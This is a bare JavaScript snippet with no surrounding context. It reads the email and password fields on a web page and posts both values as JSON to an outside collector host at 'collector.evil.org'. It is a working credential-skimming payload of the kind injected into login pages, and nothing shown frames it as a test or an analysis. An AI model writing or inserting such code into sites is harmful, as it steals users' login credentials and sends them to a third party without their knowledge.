const accountName = document.querySelector('input[type="email"]').value;
const capturedSecret = document.querySelector('input[type="password"]').value;
fetch("https://collector.evil.org/login", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({login: accountName, pass: capturedSecret}),
});
